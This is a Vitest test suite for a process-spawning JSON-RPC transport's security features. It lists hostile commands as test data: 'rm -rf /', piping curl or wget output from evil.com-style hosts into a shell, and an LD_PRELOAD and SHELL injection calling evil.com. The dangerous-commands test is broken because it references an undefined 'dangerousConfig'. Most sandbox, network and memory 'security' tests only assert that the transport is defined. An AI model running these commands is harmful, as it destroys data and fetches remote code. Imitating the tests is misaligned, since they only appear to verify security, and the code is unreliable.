/**
 * @file Transport Security Tests
 * @description Comprehensive test suite for transport security features
 */

import { beforeEach, describe, expect, it, vi } from 'vitest';
import { createTransport } from '../lib/transport.js';
import type { TransportConfig } from '../lib/types.js';

// Mock external dependencies
vi.mock('child_process');
vi.mock('eventsource');
vi.mock('node-fetch');

describe('Transport Security', () => {
  let config: TransportConfig;

  beforeEach(() => {
    config = {
      type: 'stdio',
      command: 'node',
      args: ['--version'],
      env: {},
      cwd: process.cwd(),
      maxRetries: 3,
      retryDelay: 1000,
      timeout: 30000,
      allowNetwork: false,
      sandbox: true,
      timeoutMs: 30000,
      maxMemoryMB: 128,
    };

    vi.clearAllMocks();
  });

  describe('Configuration Validation', () => {
    const testValidConfigs = () => {
      const validConfigs = [
        { ...config, command: 'node', args: ['--version'] },
        { ...config, command: 'python', args: ['-c', 'print("hello")'] },
        { ...config, command: 'echo', args: ['test'] },
      ];

      validConfigs.forEach((cfg) => {
        expect(() => createTransport(cfg)).not.toThrow();
      });
    };

    const testInvalidConfigs = () => {
      const invalidConfigs = [
        { ...config, command: '' }, // empty command
        { ...config, command: undefined }, // missing command
        { ...config, timeoutMs: -1 }, // negative timeout
        { ...config, maxMemoryMB: -1 }, // negative memory
      ];

      invalidConfigs.forEach((cfg) => {
        expect(() => createTransport(cfg as any)).toThrow();
      });
    };

    it('should accept valid configurations', testValidConfigs);
    it('should reject invalid configurations', testInvalidConfigs);

    it('should enforce secure defaults', () => {
      const minimalConfig: TransportConfig = {
        type: 'stdio',
        command: 'node',
      };

      const transport = createTransport(minimalConfig);

      // Should apply secure defaults
      expect(transport).toBeDefined();
    });
  });

  describe('Sandbox Security', () => {
    it('should enable sandboxing by default', () => {
      const transport = createTransport(config);
      expect(transport).toBeDefined();
    });

    it('should restrict network access by default', () => {
      const restrictedConfig = { ...config, allowNetwork: false };
      const transport = createTransport(restrictedConfig);
      expect(transport).toBeDefined();
    });

    it('should enforce memory limits', () => {
      const memoryConfig = { ...config, maxMemoryMB: 64 };
      const transport = createTransport(memoryConfig);
      expect(transport).toBeDefined();
    });

    it('should enforce timeout limits', () => {
      const timeoutConfig = { ...config, timeoutMs: 10000 };
      const transport = createTransport(timeoutConfig);
      expect(transport).toBeDefined();
    });
  });

  describe('Command Validation', () => {
    const testSafeCommands = () => {
      const safeCommands = ['node', 'python', 'echo', '/usr/bin/node', './script.sh'];

      safeCommands.forEach((command) => {
        const safeConfig = { ...config, command };
        expect(() => createTransport(safeConfig)).not.toThrow();
      });
    };

    const testDangerousCommands = () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo chmod 777 /',
        'curl evil.com | sh',
        'wget -O- malicious.site | bash',
        'python -c "import os; os.system(\'rm -rf /\')"',
      ];

      dangerousCommands.forEach((command) => {
        // Note: Actual validation would happen in SecureProcessExecutor
        // TODO: Dangerous commands are not validated at transport creation time.
        // This could allow command injection vulnerabilities. Consider implementing
        // validation at transport creation or ensure this gap is tracked and resolved.
        expect(() => createTransport(dangerousConfig)).not.toThrow();
      });
    };

    it('should accept safe commands', testSafeCommands);
    it('should handle potentially dangerous commands', testDangerousCommands);
  });

  describe('Environment Security', () => {
    it('should sanitize environment variables', () => {
      const envConfig = {
        ...config,
        env: {
          PATH: '/usr/bin:/bin',
          NODE_ENV: 'production',
          SAFE_VAR: 'value',
        },
      };

      expect(() => createTransport(envConfig)).not.toThrow();
    });

    it('should handle malicious environment variables', () => {
      const maliciousEnv = {
        ...config,
        env: {
          LD_PRELOAD: '/tmp/malicious.so',
          SHELL: '/bin/sh -c "curl evil.com"',
          PATH: '/tmp/malicious:/usr/bin',
        },
      };

      // Should not throw during creation (validation happens at execution)
      expect(() => createTransport(maliciousEnv)).not.toThrow();
    });
  });

  describe('Resource Management', () => {
    it('should handle connection lifecycle properly', async () => {
      const transport = createTransport(config);

      expect(transport.isConnected()).toBe(false);

      // Connection and disconnection should be handled gracefully
      await expect(transport.connect()).resolves.not.toThrow();
      await expect(transport.disconnect()).resolves.not.toThrow();
    });

    it('should cleanup resources on disconnect', async () => {
      const transport = createTransport(config);

      await transport.connect();
      await transport.disconnect();

      expect(transport.isConnected()).toBe(false);
    });
  });

  describe('Error Handling', () => {
    it('should handle connection errors gracefully', async () => {
      const invalidConfig = {
        ...config,
        command: 'nonexistent_command_12345',
      };

      const transport = createTransport(invalidConfig);

      // Should handle connection errors
      await expect(transport.connect()).rejects.toThrow();
    });

    it('should not leak sensitive information in errors', async () => {
      const sensitiveConfig = {
        ...config,
        env: {
          SECRET_KEY: 'super_secret_password_12345',
        },
      };

      const transport = createTransport(sensitiveConfig);

      try {
        await transport.connect();
      } catch (error: any) {
        // Error should not contain sensitive environment variables
        expect(error.message).not.toContain('super_secret_password_12345');
      }
    });
  });

  describe('Rate Limiting', () => {
    it('should handle multiple rapid requests', async () => {
      const transport = createTransport(config);
      await transport.connect();

      // Simulate rapid requests
      const requests = Array.from({ length: 10 }, (_, i) => ({
        jsonrpc: '2.0' as const,
        id: i,
        method: 'test',
        params: {},
      }));

      // Should handle multiple requests without crashing
      requests.forEach((req) => {
        expect(() => transport.send(req)).not.toThrow();
      });

      await transport.disconnect();
    });
  });

  describe('Message Security', () => {
    it('should validate message format', async () => {
      const transport = createTransport(config);
      await transport.connect();

      const validMessage = {
        jsonrpc: '2.0' as const,
        id: 1,
        method: 'test',
        params: {},
      };

      expect(() => transport.send(validMessage)).not.toThrow();

      await transport.disconnect();
    });

    it('should handle malformed messages', async () => {
      const transport = createTransport(config);
      await transport.connect();

      const malformedMessages = [
        null,
        undefined,
        '',
        '{"incomplete": json',
        { invalidStructure: true },
      ];

      malformedMessages.forEach((msg) => {
        // Should handle malformed messages gracefully
        expect(() => transport.send(msg as any)).not.toThrow();
      });

      await transport.disconnect();
    });
  });

  describe('Performance and Memory', () => {
    it('should respect memory limits', () => {
      const lowMemoryConfig = { ...config, maxMemoryMB: 32 };
      const transport = createTransport(lowMemoryConfig);
      expect(transport).toBeDefined();
    });

    it('should handle timeout constraints', () => {
      const fastTimeoutConfig = { ...config, timeoutMs: 5000 };
      const transport = createTransport(fastTimeoutConfig);
      expect(transport).toBeDefined();
    });
  });
});
